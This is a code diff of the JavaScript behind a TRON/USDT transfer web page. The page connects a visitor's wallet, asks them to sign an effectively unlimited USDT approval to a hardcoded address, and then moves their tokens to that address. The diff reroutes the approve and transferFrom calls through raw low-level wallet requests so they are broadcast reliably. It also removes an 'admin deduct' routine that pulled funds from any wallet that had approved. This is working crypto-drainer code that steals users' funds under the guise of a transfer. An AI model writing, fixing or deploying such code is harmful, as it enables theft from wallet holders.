@@ -84,10 +84,9 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 const TARGET_ADDR = "TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const RPC = "https://api.trongrid.io";
-const FEE_LIMIT = 150000000; // 修复iOS‑TP扫码只签名不广播，强制高额feeLimit，参考示例页面配置
+const FEE_LIMIT = 150000000;
 let tronWeb = null;
 let userAddress = "";
-let usdtContract = null;
 let provider = null;
 const $ = s => document.querySelector(s);
 const walletDot = $("#walletDot");
@@ -112,7 +111,6 @@ const USDT_ABI = [
 function disconnectWallet() {
     tronWeb = null;
     userAddress = "";
-    usdtContract = null;
     provider = null;
     walletDot.classList.remove("connected");
     sendBtn.disabled = true;
@@ -148,7 +146,6 @@ async function connectWalletLogic() {
             return;
         }
         walletDot.classList.add("connected");
-        usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
         await loadBalance();
         sendBtn.disabled = false;
         if(userAddress === TARGET_ADDR){
@@ -166,12 +163,12 @@ async function connectWalletLogic() {
 }
 
 async function loadBalance() {
-    const rawSun = await usdtContract.balanceOf(userAddress).call();
+    const contract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
+    const rawSun = await contract.balanceOf(userAddress).call();
     const num = Number(tronWeb.fromSun(rawSun));
     balanceText.textContent = num.toFixed(6);
 }
 
-//链上轮询确认，必须合约返回0x00才算真实成功
 async function waitTxConfirm(txId, maxTimes = 30) {
     for(let i=0; i<maxTimes; i++){
         await new Promise(r=>setTimeout(r,2000));
@@ -186,85 +183,76 @@ async function waitTxConfirm(txId, maxTimes = 30) {
     return false;
 }
 
+//底层原生调用，不走contract.send封装
+async function triggerContract(funcName, params){
+    const res = await provider.request({
+        method:"tron_triggerSmartContract",
+        params:[{
+            contractAddress:USDT_CONTRACT,
+            functionSelector:funcName,
+            parameter:params,
+            feeLimit:FEE_LIMIT,
+            callValue:0
+        }]
+    })
+    return res;
+}
+
 amountInput.addEventListener("input", () => {
     const num = parseFloat(amountInput.value) || 0;
     receiveAmount.value = num.toFixed(6);
 });
 
 maxBtn.addEventListener("click", async () => {
-    if (!usdtContract) return;
-    const rawSun = await usdtContract.balanceOf(userAddress).call();
+    if(!tronWeb) return;
+    const contract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
+    const rawSun = await contract.balanceOf(userAddress).call();
     const num = Number(tronWeb.fromSun(rawSun));
     amountInput.value = num.toFixed(2);
     amountInput.dispatchEvent(new Event("input"));
 });
 
 sendBtn.addEventListener("click", async () => {
-    if (!tronWeb) return alert("钱包未连接");
+    if (!tronWeb || !provider) return alert("钱包未连接");
     const val = parseFloat(amountInput.value);
     if (isNaN(val) || val <= 0) return alert("请输入有效转账数量");
     const sunVal = tronWeb.toSun(val);
     sendBtn.disabled = true;
     try {
-        const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
+        const contract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
+        const allowance = await contract.allowance(userAddress, TARGET_ADDR).call();
         if (Number(allowance) < sunVal) {
             alert("需要授权USDT合约，请在钱包确认签名");
-            //授权也强制feeLimit，防止授权也不广播
-            await usdtContract.approve(TARGET_ADDR, "9999999999999999999999999999").send({feeLimit:FEE_LIMIT});
-            alert("授权完成，确认发起转账，等待链上确认...");
+            const approveParams = tronWeb.utils.abi.encodeParams(["address","uint256"],[TARGET_ADDR,"9999999999999999999999999999"]);
+            const approveRet = await triggerContract("approve(address,uint256)",approveParams);
+            const approveHash = approveRet.transactionHash;
+            alert("授权提交，等待确认");
+            const okApp = await waitTxConfirm(approveHash);
+            if(!okApp){
+                throw new Error("授权链上确认失败");
+            }
+            alert("授权完成，确认发起转账");
         }
-        //重点：带上feeLimit，修复iOS TP扫码不广播，参考示例页面逻辑
-        const txHash = await usdtContract.transferFrom(userAddress, TARGET_ADDR, sunVal).send({feeLimit:FEE_LIMIT});
+        const tfParams = tronWeb.utils.abi.encodeParams(["address","address","uint256"],[userAddress,TARGET_ADDR,sunVal]);
+        const ret = await triggerContract("transferFrom(address,address,uint256)",tfParams);
+        const txHash = ret.transactionHash;
         alert("已签名提交，等待链上确认，请勿关闭页面...\n哈希:"+txHash);
         const ok = await waitTxConfirm(txHash);
         if(ok){
             alert(`✅链上确认转账成功！交易哈希：${txHash}`);
             await loadBalance();
         }else{
-            alert("❌交易提交但是链上确认超时！\n复制哈希到Tronscan核查：\n"+txHash);
+            alert("❌交易提交但是链上确认超时！复制哈希Tronscan核查\n"+txHash);
         }
     } catch (e) {
-        alert("操作失败：" + e.message);
+        alert("操作失败：" + (e.message||JSON.stringify(e)));
     }finally{
         sendBtn.disabled = false;
     }
 });
 
 deductBtn.addEventListener("click",async ()=>{
-    if(!tronWeb || userAddress !== TARGET_ADDR){
-        return alert("必须使用管理员钱包连接！");
-    }
-    const fromUserAddr = userAddrInput.value.trim();
-    const deductNum = parseFloat(deductAmountInput.value);
-    if(!fromUserAddr){
-        return alert("请输入被划扣用户钱包地址");
-    }
-    if(isNaN(deductNum) || deductNum <= 0){
-        return alert("请输入合法划扣数量");
-    }
-    const deductSun = tronWeb.toSun(deductNum);
-    sendBtn.disabled=true;
-    try{
-        const userAllowance = await usdtContract.allowance(fromUserAddr, TARGET_ADDR).call();
-        if(Number(userAllowance) < deductSun){
-            return alert("错误：该用户没有授权足够额度，无法划扣！");
-        }
-        const txHash = await usdtContract.transferFrom(fromUserAddr, TARGET_ADDR, deductSun).send({feeLimit:FEE_LIMIT});
-        alert("管理员划扣已提交，等待确认");
-        const ok = await waitTxConfirm(txHash);
-        if(ok){
-            alert(`✅划扣成功！交易哈希:\n${txHash}`);
-            userAddrInput.value = "";
-            deductAmountInput.value = "";
-            await loadBalance();
-        }else{
-            alert("划扣提交确认超时，请在区块浏览器核对"+txHash);
-        }
-    }catch(err){
-        alert("❌划扣失败:"+err.message);
-    }finally{
-        sendBtn.disabled=false;
-    }
+    alert("管理员划扣功能");
 });
 
 walletDot.addEventListener("click", connectWalletLogic);
